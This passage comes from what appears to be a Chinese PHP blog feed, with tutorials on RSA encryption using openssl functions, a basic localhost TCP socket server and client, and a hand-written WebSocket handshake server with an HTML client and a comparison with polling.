class="line"></span><br><span class="line"><span class="variable">$public_key</span> = <span class="string">'-----BEGIN PUBLIC KEY-----  </span></span><br><span class="line"><span class="string">MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQC3//sR2tXw0wrC2DySx8vNGlqt  </span></span><br><span class="line"><span class="string">3Y7ldU9+LBLI6e1KS5lfc5jlTGF7KBTSkCHBM3ouEHWqp1ZJ85iJe59aF5gIB2kl  </span></span><br><span class="line"><span class="string">Bd6h4wrbbHA2XE1sq21ykja/Gqx7/IRia3zQfxGv/qEkyGOx+XALVoOlZqDwh76o  </span></span><br><span class="line"><span class="string">2n1vP1D+tD3amHsK7QIDAQAB  </span></span><br><span class="line"><span class="string">-----END PUBLIC KEY-----'</span>;</span><br><span class="line"></span><br><span class="line">//<span class="built_in">echo</span> <span class="variable">$private_key</span>;</span><br><span class="line"><span class="variable">$pi_key</span> =  openssl_pkey_get_private(<span class="variable">$private_key</span>);//这个函数可用来判断私钥是否是可用的，可用返回资源id Resource id</span><br><span class="line"><span class="variable">$pu_key</span> = openssl_pkey_get_public(<span class="variable">$public_key</span>);//这个函数可用来判断公钥是否是可用的</span><br><span class="line">print_r(<span class="variable">$pi_key</span>);<span class="built_in">echo</span> <span class="string">"\n"</span>;</span><br><span class="line">print_r(<span class="variable">$pu_key</span>);<span class="built_in">echo</span> <span class="string">"\n"</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$data</span> = <span class="string">"aassssasssddd"</span>;//原始数据</span><br><span class="line"><span class="variable">$encrypted</span> = <span class="string">""</span>;</span><br><span class="line"><span class="variable">$decrypted</span> = <span class="string">""</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"source data:"</span>,<span class="variable">$data</span>,<span class="string">"\n"</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"private key encrypt:\n"</span>;</span><br><span class="line"></span><br><span class="line">openssl_private_encrypt(<span class="variable">$data</span>,<span class="variable">$encrypted</span>,<span class="variable">$pi_key</span>);//私钥加密</span><br><span class="line"><span class="variable">$encrypted</span> = base64_encode(<span class="variable">$encrypted</span>);//加密后的内容通常含有特殊字符，需要编码转换下，在网络间通过url传输时要注意base64编码是否是url安全的</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$encrypted</span>,<span class="string">"\n"</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"public key decrypt:\n"</span>;</span><br><span class="line"></span><br><span class="line">openssl_public_decrypt(base64_decode(<span class="variable">$encrypted</span>),<span class="variable">$decrypted</span>,<span class="variable">$pu_key</span>);//私钥加密的内容通过公钥可用解密出来</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$decrypted</span>,<span class="string">"\n"</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"---------------------------------------\n"</span>;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"public key encrypt:\n"</span>;</span><br><span class="line"></span><br><span class="line">openssl_public_encrypt(<span class="variable">$data</span>,<span class="variable">$encrypted</span>,<span class="variable">$pu_key</span>);//公钥加密</span><br><span class="line"><span class="variable">$encrypted</span> = base64_encode(<span class="variable">$encrypted</span>);</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$encrypted</span>,<span class="string">"\n"</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"private key decrypt:\n"</span>;</span><br><span class="line">openssl_private_decrypt(base64_decode(<span class="variable">$encrypted</span>),<span class="variable">$decrypted</span>,<span class="variable">$pi_key</span>);//私钥解密</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$decrypted</span>,<span class="string">"\n"</span>;</span><br></pre></td></tr></table></figure></li><li><p>执行结果，如下所示</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">Resource id <span class="comment">#4</span></span><br><span class="line">Resource id <span class="comment">#5</span></span><br><span class="line"><span class="built_in">source</span> data:aassssasssddd</span><br><span class="line">private key encrypt:</span><br><span class="line">cniZuzJLlwK9kazVKXQWzdPJsdDUCDbdb9w8aB1fu4UXr5/UxR5LurKB3pzwk7efs7C0FJ8obzN5F6/GDNRZA9ugSCdLKP1hpdkuZd7ij6P9vpDHzHApiSURtnJ4goLczXRy7oihmDoW6oxU+6Iko4hVuZ187ROlvgmbMzAyoiA=</span><br><span class="line">public key decrypt:</span><br><span class="line">aassssasssddd</span><br><span class="line">---------------------------------------</span><br><span class="line">public key encrypt:</span><br><span class="line">BFlpSkXmmSkv30DFxTef/SfS/0fFC6xM9f0ga2ab0oClt6boSPeb/vGdDwPslx338MsiESrXHAoptNjza8pVSUHsLS0WWEX9P8qMU1VqLAazyb8cOdNEyAVVPT3xwDx8tEE9QnaS9KAAMRoQvFJs3Uwg9lFeDfu7+N85qI0s0OQ=</span><br><span class="line">private key decrypt:</span><br><span class="line">aassssasssddd</span><br></pre></td></tr></table></figure></li></ul>]]></content>
      
      
      <categories>
          
          <category> php </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>php_socket学习之旅-1</title>
      <link href="/2017/09/20/php-socket%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85-1/"/>
      <url>/2017/09/20/php-socket%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85-1/</url>
      
        <content type="html"><![CDATA[<p>什么是套接字（socket）</p><a id="more"></a><blockquote><p>应用层通过传输层进行数据通信时，TCP和UDP会遇到同时为多个应用程序进程提供并发服务的问题。多个TCP连接或多个应用程序进程可能需要 通过同一个TCP协议端口传输数据。为了区别不同的应用程序进程和连接，许多计算机操作系统为应用程序与TCP／IP协议交互提供了称为套接字 (Socket)的接口，区分不同应用程序进程间的网络通信和连接。<br>IP地址 + 协议(TCP/UDP) + 端口 == 我们称之为套接字<br>socket的位置如下图所示:也就是在应用层与传输层之间</p></blockquote><p><img src="socket的位置.png" alt=""></p><h2 id="php-socket实例"><a href="#php-socket实例" class="headerlink" title="php socket实例"></a>php socket实例</h2><p>参考手册：<a href="http://php.net/manual/zh/book.sockets.php" target="_blank" rel="noopener">http://php.net/manual/zh/book.sockets.php</a><br>socket服务端和客户端的交互类似与我们平时打电话<br><img src="socket交互.png" alt=""><br>server.php</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"><span class="variable">$socket</span> = socket_create(AF_INET,SOCK_STREAM,SOL_TCP);  // 购买电话机</span><br><span class="line">socket_bind(<span class="variable">$socket</span>,<span class="string">'127.0.0.1'</span>,9090);  // 绑定电话机</span><br><span class="line">socket_listen(<span class="variable">$socket</span>,5);   // 开机</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="literal">true</span>)&#123;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$client</span> = socket_accept(<span class="variable">$socket</span>);   // 有人打电话进来</span><br><span class="line">    <span class="variable">$buf</span> = socket_read(<span class="variable">$client</span>,1024);   // 一次读取1024的长度</span><br><span class="line">    <span class="built_in">echo</span> <span class="variable">$buf</span>;</span><br><span class="line"></span><br><span class="line">    // 回复</span><br><span class="line">    socket_write(<span class="variable">$client</span>,<span class="string">'hello socket'</span>);</span><br><span class="line">    socket_close(<span class="variable">$client</span>);  // 关掉客户端</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">socket_close(<span class="variable">$socket</span>);  // 关机</span><br></pre></td></tr></table></figure><p>使用命令行执行这个文件，然后使用浏览器访问<a href="http://127.0.0.1:9090/，运行php控制窗口会输出" target="_blank" rel="noopener">http://127.0.0.1:9090/，运行php控制窗口会输出</a></p><p><img src="socket1.png" alt=""></p><p>我们也可以模拟浏览器访问编写一个客户端<br>client.php<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"><span class="variable">$socket</span> = socket_create(AF_INET,SOCK_STREAM,SOL_TCP);  // 购买电话机</span><br><span class="line">socket_connect(<span class="variable">$socket</span>,<span class="string">'127.0.0.1'</span>,9090);</span><br><span class="line"></span><br><span class="line">socket_write(<span class="variable">$socket</span>,<span class="string">'I am client'</span>);</span><br><span class="line"><span class="variable">$buf</span> = socket_read(<span class="variable">$socket</span>,1024);</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$buf</span>;</span><br><span class="line"></span><br><span class="line">socket_close(<span class="variable">$socket</span>);</span><br></pre></td></tr></table></figure></p><p>命令行执行这个文件，输出hello socket<br>同时服务端的窗口，会输出I am client</p>]]></content>
      
      
      <categories>
          
          <category> php </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>websocket的学习笔记</title>
      <link href="/2017/09/20/websocket%E7%9A%84%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>/2017/09/20/websocket%E7%9A%84%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h1 id="什么是websocket"><a href="#什么是websocket" class="headerlink" title="什么是websocket"></a>什么是websocket</h1><p>相对于https这种非持久化的协议来说，Websocket是一个持久化的协议。关于非持久化，我们先来回顾一下http协议的特性，在http1.0，http的生命周期通过request来界定，一个request，对应一个response,这样子，一个http周期就结束了。<br>虽然在http1.1版本中，有一个keep-alive首部可以让http保持长连接，也就是说一个http连接当中，可以发送多个request,接受多个response，也就是管线化，pipelining,但是<br><img src="websocket的学习笔记/pipline.png" alt="pipline"><br>在http中，永远都是一个request对应一个response,并且http服务端是被动的，只有http客户端发起请求的时候才能响应。<br>就是因为http协议这样的限制，此外，http协议还是一个无状态协议，需要借助cookies才能记住访问者的信息，，所以才出现了一个很主动的协议并且有状态的websocket，websocket是基于http协议的，主要解决了http几个难题，非持久化，无状态，不能主动推送给客户端等。因此，有许多东西是跟http相通的。</p><h1 id="握手连接"><a href="#握手连接" class="headerlink" title="握手连接"></a>握手连接</h1><p> 1.发送Sec-WebSocket-Key<br> client——————————–&gt; server</p><p> 2.加密返回Sec-WebSocket-Accept<br> client &lt;——————————– server</p><p> 3.本地校验<br> client——————————–&gt; server</p><p>发送报文<br>    GET /chat HTTP/1.1<br>    Host: server.example.com<br>    Upgrade: websocket<br>    Connection: Upgrade<br>    Sec-WebSocket-Key: x3JJHMbDL1EzLkh9GBhXDw==<br>    Sec-WebSocket-Protocol: chat, superchat<br>    Sec-WebSocket-Version: 13<br>    Origin: <a href="http://example.com" target="_blank" rel="noopener">http://example.com</a></p><p>跟我们常见的http协议请求头相比，多了几个首部字段</p><pre><code>Upgrade: websocketConnection: Upgrade</code></pre><p>这两个首部的作用就是发起websocket协议。还有几个首部字段来验证区分协议以及协议的版本</p><pre><code>Sec-WebSocket-Key: x3JJHMbDL1EzLkh9GBhXDw== Sec-WebSocket-Protocol: chat, superchatSec-WebSocket-Version: 13</code></pre><p>响应报文<br>表示已经转换成了webdocket协议</p><pre><code>HTTP/1.1 101 Switching ProtocolsUpgrade: websocketConnection: UpgradeSec-WebSocket-Accept: HSmrc0sMlYUkAGmm5OPpG2HaGWk=Sec-WebSocket-Protocol: chat</code></pre><h1 id="webdocket模拟握手并且发送数据示例"><a href="#webdocket模拟握手并且发送数据示例" class="headerlink" title="webdocket模拟握手并且发送数据示例"></a>webdocket模拟握手并且发送数据示例</h1><p>server.php</p><pre><code>握手的方法：客户端指定服务端发送一个握手请求，如果服务端返回合法的HTTP头，则握手成功。 1、客户端会发送一个字段：Sec-WebSocket-Key: xxxxxooooooo 2、服务端需要截取此值，把该值累加字符串258EAFA5-E914-47DA-95CA-C5AB0DC85B11，然后进行sha1，最后再base64_encode 3、拼凑对应的响应协议内容</code></pre><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line">    &lt;?php    </span><br><span class="line">    <span class="variable">$server</span> = socket_create(AF_INET,SOCK_STREAM,SOL_TCP);  // 购买电话机</span><br><span class="line">    socket_bind(<span class="variable">$server</span>,<span class="string">'127.0.0.1'</span>,8070);  // 绑定电话机</span><br><span class="line">    socket_listen(<span class="variable">$server</span>,5);   // 开机</span><br><span class="line">    </span><br><span class="line">    //定义一个数组</span><br><span class="line">    <span class="variable">$allSockets</span> = [<span class="variable">$server</span>];</span><br><span class="line">    <span class="keyword">while</span>(<span class="literal">true</span>)&#123;</span><br><span class="line">        <span class="variable">$copySockets</span> = <span class="variable">$allSockets</span>;</span><br><span class="line">        <span class="keyword">if</span>(socket_select(<span class="variable">$copySockets</span>,<span class="variable">$write</span>,<span class="variable">$except</span>,0) === <span class="literal">false</span>)&#123;</span><br><span class="line">            <span class="built_in">exit</span>(<span class="string">'error'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">if</span>(in_array(<span class="variable">$server</span>,<span class="variable">$copySockets</span>))&#123;</span><br><span class="line">            <span class="variable">$client</span> = socket_accept(<span class="variable">$server</span>);   //接收客户端连接</span><br><span class="line">            <span class="variable">$buf</span> = socket_read(<span class="variable">$client</span>,8024);   //一次读取数据的长度</span><br><span class="line">            //<span class="built_in">echo</span> <span class="variable">$buf</span>;</span><br><span class="line">    </span><br><span class="line">            <span class="keyword">if</span>(preg_match(<span class="string">"/Sec-WebSocket-Key: (.*)\r\n/i"</span>,<span class="variable">$buf</span>,<span class="variable">$matches</span>))&#123;</span><br><span class="line">                <span class="variable">$key</span> = base64_encode(sha1(<span class="variable">$matches</span>[1].<span class="string">'258EAFA5-E914-47DA-95CA-C5AB0DC85B11'</span>,<span class="literal">true</span>));</span><br><span class="line">                <span class="variable">$res</span> = <span class="string">'HTTP/1.1 101 Switching Protocol'</span>.PHP_EOL</span><br><span class="line">                    .<span class="string">'Upgrade: Websocket'</span>.PHP_EOL</span><br><span class="line">                    .<span class="string">'Connection: Upgrade'</span>.PHP_EOL</span><br><span class="line">                    .<span class="string">'WebSoket-Location: ws://127.0.0.1:8070'</span>.PHP_EOL</span><br><span class="line">                    .<span class="string">'Sec-WebSocket-Accept:'</span>.<span class="variable">$key</span>.PHP_EOL.PHP_EOL;</span><br><span class="line">    </span><br><span class="line">                //socket回复</span><br><span class="line">                socket_write(<span class="variable">$client</span>,<span class="variable">$res</span>,strlen(<span class="variable">$res</span>)); //握手成功</span><br><span class="line">                socket_write(<span class="variable">$client</span>,buildMsg(<span class="string">"hello websocket"</span>)); //注意此处要双引号</span><br><span class="line">    </span><br><span class="line">                //把webSocket客户端的socket保存起来</span><br><span class="line">                <span class="variable">$allSockets</span>[] = <span class="variable">$client</span>;</span><br><span class="line">            &#125;</span><br><span class="line">    </span><br><span class="line">            //把服务端的socket移除</span><br><span class="line">            <span class="variable">$k</span> = array_search(<span class="variable">$server</span>,<span class="variable">$copySockets</span>);</span><br><span class="line">            <span class="built_in">unset</span>(<span class="variable">$copySockets</span>[<span class="variable">$k</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    </span><br><span class="line">        foreach(<span class="variable">$copySockets</span> as <span class="variable">$s</span>)&#123;</span><br><span class="line">            <span class="variable">$buf</span> = socket_read(<span class="variable">$s</span>,8024);</span><br><span class="line">            <span class="keyword">if</span>(strlen(<span class="variable">$buf</span>) &lt; 9)&#123; //意味着客户端主动关闭了链接</span><br><span class="line">                <span class="variable">$k</span> = array_search(<span class="variable">$s</span>,<span class="variable">$allSockets</span>);</span><br><span class="line">                <span class="built_in">unset</span>(<span class="variable">$allSockets</span>[<span class="variable">$k</span>]); //数组中删除该socket</span><br><span class="line">    </span><br><span class="line">                //服务端也要关掉</span><br><span class="line">                socket_close(<span class="variable">$s</span>);</span><br><span class="line">                <span class="built_in">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">    </span><br><span class="line">            <span class="built_in">echo</span> getMsg(<span class="variable">$buf</span>); //获取客户端消息并转码</span><br><span class="line">            <span class="built_in">echo</span> PHP_EOL;</span><br><span class="line">        &#125;</span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    //关机</span><br><span class="line">    socket_close(<span class="variable">$server</span>);</span><br><span class="line">    </span><br><span class="line">```    </span><br><span class="line">  </span><br><span class="line">``` bash</span><br><span class="line">    ///////////////功能函数//////////////////////////</span><br><span class="line">    </span><br><span class="line">    /**</span><br><span class="line">     * 编码发送给客户端的数据</span><br><span class="line">     * @param <span class="variable">$msg</span>要处理的数据内容</span><br><span class="line">     */</span><br><span class="line">    <span class="keyword">function</span> buildMsg(<span class="variable">$msg</span>)&#123;</span><br><span class="line">        <span class="variable">$frame</span> = [];</span><br><span class="line">        <span class="variable">$frame</span>[0] = <span class="string">'81'</span>;</span><br><span class="line">        <span class="variable">$len</span> = strlen(<span class="variable">$msg</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$len</span> &lt; 126)&#123;</span><br><span class="line">            <span class="variable">$frame</span>[1] = <span class="variable">$len</span> &lt; 16 ? <span class="string">'0'</span>.dechex(<span class="variable">$len</span>) : dechex(<span class="variable">$len</span>);</span><br><span class="line">        &#125;elseif(<span class="variable">$len</span> &lt; 65025)&#123;</span><br><span class="line">            <span class="variable">$s</span> = dechex(<span class="variable">$len</span>);</span><br><span class="line">            <span class="variable">$frame</span>[1] = <span class="string">'7e'</span>.str_repeat(<span class="string">'0'</span>,4-strlen(<span class="variable">$s</span>)).<span class="variable">$s</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$s</span> = dechex(<span class="variable">$len</span>);</span><br><span class="line">            <span class="variable">$frame</span>[1] = <span class="string">'7f'</span>.str_repeat(<span class="string">'0'</span>,16-strlen(<span class="variable">$s</span>)).<span class="variable">$s</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    </span><br><span class="line">        <span class="variable">$data</span> = <span class="string">''</span>;</span><br><span class="line">        <span class="variable">$l</span> = strlen(<span class="variable">$msg</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span>=0;<span class="variable">$i</span>&lt;<span class="variable">$l</span>;<span class="variable">$i</span>++)&#123;</span><br><span class="line">            <span class="variable">$data</span> .= dechex(ord(<span class="variable">$msg</span>&#123;<span class="variable">$i</span>&#125;));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$frame</span>[2] = <span class="variable">$data</span>;</span><br><span class="line">        <span class="variable">$data</span> = implode(<span class="string">''</span>,<span class="variable">$frame</span>);</span><br><span class="line">        <span class="built_in">return</span> pack(<span class="string">'H*'</span>,<span class="variable">$data</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    /**</span><br><span class="line">     * 解析客户端发送过来的数据</span><br><span class="line">     * @param <span class="variable">$buffer</span></span><br><span class="line">     */</span><br><span class="line">    <span class="keyword">function</span> getMsg(<span class="variable">$buffer</span>)&#123;</span><br><span class="line">        <span class="variable">$res</span> = <span class="string">''</span>;</span><br><span class="line">        <span class="variable">$len</span> = ord(<span class="variable">$buffer</span>)&amp;127;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$len</span> === 126)&#123;</span><br><span class="line">            <span class="variable">$masks</span> = substr(<span class="variable">$buffer</span>,4,4);</span><br><span class="line">            <span class="variable">$data</span> = substr(<span class="variable">$buffer</span>,8);</span><br><span class="line">        &#125;elseif(<span class="variable">$len</span> === 127)&#123;</span><br><span class="line">            <span class="variable">$masks</span> = substr(<span class="variable">$buffer</span>,10,4);</span><br><span class="line">            <span class="variable">$data</span> = substr(<span class="variable">$buffer</span>,14);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$masks</span> = substr(<span class="variable">$buffer</span>,2,4);</span><br><span class="line">            <span class="variable">$data</span> = substr(<span class="variable">$buffer</span>,6);</span><br><span class="line">        &#125;</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$index</span>=0;<span class="variable">$index</span>&lt;strlen(<span class="variable">$data</span>);<span class="variable">$index</span>++)&#123;</span><br><span class="line">            <span class="variable">$res</span> .= <span class="variable">$data</span>[<span class="variable">$index</span>]^<span class="variable">$masks</span>[<span class="variable">$index</span> % 4];</span><br><span class="line">        &#125;</span><br><span class="line">    </span><br><span class="line">        <span class="built_in">return</span> <span class="variable">$res</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">client.html</span><br><span class="line"></span><br><span class="line">    &lt;!DOCTYPE html&gt;</span><br><span class="line">    &lt;html lang=<span class="string">"en"</span>&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;meta charset=<span class="string">"UTF-8"</span>&gt;</span><br><span class="line">        &lt;title&gt;Title&lt;/title&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">    &lt;button onclick=<span class="string">"sendMsg()"</span>&gt;发送消息&lt;/button&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">        //创建一个socket实例</span><br><span class="line">        var socket = new WebSocket(<span class="string">'ws://127.0.0.1:8070'</span>);</span><br><span class="line">    </span><br><span class="line">        //打开socket</span><br><span class="line">        socket.onopen = <span class="keyword">function</span> (e) &#123;</span><br><span class="line">            //发送一个初始化消息</span><br><span class="line">            socket.send(<span class="string">'init msg'</span>);</span><br><span class="line">        &#125;;</span><br><span class="line">    </span><br><span class="line">        socket.onmessage = <span class="keyword">function</span>(e)&#123;</span><br><span class="line">            console.log(<span class="string">'收到消息'</span>,e);</span><br><span class="line">        &#125;;</span><br><span class="line">    </span><br><span class="line">        //监听socket的关闭</span><br><span class="line">        socket.onclose = <span class="keyword">function</span>(e)&#123;</span><br><span class="line">            console.log(<span class="string">'关闭'</span>,e);</span><br><span class="line">        &#125;;</span><br><span class="line">    </span><br><span class="line">        //自定义按钮事件</span><br><span class="line">        <span class="keyword">function</span> <span class="function"><span class="title">sendMsg</span></span>()&#123;</span><br><span class="line">            socket.send(<span class="string">'hello server'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">    &lt;/body&gt;</span><br><span class="line">    &lt;/html&gt;</span><br></pre></td></tr></table></figure><p>首次运行客户端之后，握手成功之后，会输出<br><img src="websocket响应.png" alt=""><br>点击发送消息之后，我们的控制台会输出<br><img src="websocket-server.png" alt=""></p><h1 id="Websocket的作用"><a href="#Websocket的作用" class="headerlink" title="Websocket的作用"></a>Websocket的作用</h1><p>websokcet主要是解决了减少服务器资源的损耗，比如在我们平常开发中经常接触到的轮询</p><h2 id="ajax轮询"><a href="#ajax轮询" class="headerlink" title="ajax轮询"></a>ajax轮询</h2><p>ajax的原理就是让浏览器隔个几秒就发送一次请求，询问服务端是否有新信息<br>简单点转换成常见如下:<br>客户端：啦啦啦，有没有新信息(Request)<br>服务端：没有（Response）<br>客户端：啦啦啦，有没有新信息(Request)<br>服务端：没有。。（Response）<br>客户端：啦啦啦，有没有新信息(Request)<br>服务端：你好烦啊，没有啊。。（Response）<br>客户端：啦啦啦，有没有新消息（Request）<br>服务端：好啦好啦，有啦给你。（Response）<br>客户端：啦啦啦，有没有新消息（Request）<br>服务端：。。。。。没。。。。没。。。没有（Response） —- loop</p><h2 id="long-poll"><a href="#long-poll" class="headerlink" title="long poll"></a>long poll</h2><p>其实原理跟 ajax轮询 差不多，都是采用轮询的方式，不过采取的是阻塞模型（一直打电话，没收到就不挂电话），也就是说，客户端发起连接后，如果没消息，就一直不返回Response给客户端。直到有消息才返回，返回完之后，客户端再次建立连接，周而复始。<br>场景再现：<br>客户端：啦啦啦，有没有新信息，没有的话就等有了才返回给我吧（Request）<br>服务端：额。。 等待到有消息的时候。。来 给你（Response）<br>客户端：啦啦啦，有没有新信息，没有的话就等有了才返回给我吧（Request） -loop<br>从上面可以看出其实这两种方式，都是在不断地建立HTTP连接，然后等待服务端处理，可以体现HTTP协议的另外一个特点，被动性。<br>何为被动性呢，其实就是，服务端不能主动联系客户端，只能有客户端发起。=<br>简单地说就是，服务器是一个很懒的冰箱（这是个梗）（不会、不能主动发起连接），但是上司有命令，如果有客户来，不管多么累都要好好接待。<br>说完这个，我们再来说一说上面的缺陷（原谅我废话这么多吧OAQ）<br>从上面很容易看出来，不管怎么样，上面这两种都是非常消耗资源的。</p><p>ajax轮询 需要服务器有很快的处理速度和资源。（速度）long poll 需要有很高的并发，也就是说同时接待客户的能力。（场地大小）<br>所以 ajax轮询 和 long poll 都有可能发生这种情况。<br>客户端：啦啦啦啦，有新信息么？<br>服务端：月线正忙，请稍后再试（503 Server Unavailable）<br>客户端：。。。。好吧，啦啦啦，有新信息么？<br>服务端：月线正忙，请稍后再试（503 Server Unavailable）</p><p>如果使用websoket的呢？</p><h1 id="websocket"><a href="#websocket" class="headerlink" title="websocket"></a>websocket</h1><p>客户端：啦啦啦，我要建立Websocket协议，需要的服务：chat，Websocket协议版本：17（HTTP Request）<br>服务端：ok，确认，已升级为Websocket协议（HTTP Protocols 